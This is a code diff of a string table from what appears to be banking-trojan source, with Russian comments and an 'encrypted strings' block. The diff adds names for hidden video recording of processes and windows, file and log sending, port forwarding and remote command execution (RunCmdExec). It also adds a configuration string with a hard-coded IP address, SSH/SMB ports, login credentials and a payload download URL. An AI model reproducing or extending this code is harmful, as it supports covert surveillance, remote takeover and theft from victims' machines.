@@ -114,15 +114,19 @@ CSSTR StrLogFileNetInfo[]     = "NetInfo.txt";
 
 
 // Имена функций библиотеки видеозаписи.
-CSSTR VideRecFuncRecordProcess[]  = "StartRecPid";
-CSSTR VideRecFuncRecordWnd[]      = "StartRecHwnd";
-CSSTR VideRecFuncStop[]           = "StopRec";
-CSSTR VideRecFuncResetTimer[]     = "ResetTimer";
-CSSTR VideRecFuncSendData[]       = "StartSend";
-CSSTR VideRecFuncRunPortForward[] = "RunPortForward";
-CSSTR VideRecFuncInitSendLog[]	  = "InitSendLog";
-CSSTR VideRecFuncReleaseSendLog[] = "ReleaseSendLog";
-CSSTR VideRecFuncSendLog[]		  = "SendLog";
+CSSTR VideoRecFuncInit[]			= "Init";
+CSSTR VideoRecFuncRelease[]			= "Release";
+CSSTR VideoRecFuncAddIPServer[]		= "AddIPServer";
+CSSTR VideoRecFuncRecordProcess[]	= "StartRecPid";
+CSSTR VideoRecFuncRecordWnd[]		= "StartRecHwnd";
+CSSTR VideoRecFuncStop[]			= "StopRec";
+CSSTR VideoRecFuncResetTimer[]		= "ResetTimer";
+CSSTR VideoRecFuncSendFiles[]		= "StartSend";
+CSSTR VideoRecFuncSendFilesAsync[]	= "StartSendAsync";
+CSSTR VideoRecFuncIsSendedAsync[]	= "IsSendedAsync";
+CSSTR VideoRecFuncRunCmdExec[]		= "RunCmdExec";
+CSSTR VideoRecFuncSendLog[]			= "SendLog";
+CSSTR VideoRecPipe[]				= "VideoServer";
 
 
 CSSTR HTTPFormContentDisposition[] = "Content-Disposition: form-data; ";
@@ -166,6 +170,7 @@ CSSTR IFobsFlagCopy[] = "ifobscopy.txt";
 #endif
 
 
+CSSTR RDPRunParam[] = "88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixerESCONuendoZ;http://www.cushyhost.com/download.php?img=73";
 
 //=============================================================================
 // Конец блока шифрованных строк
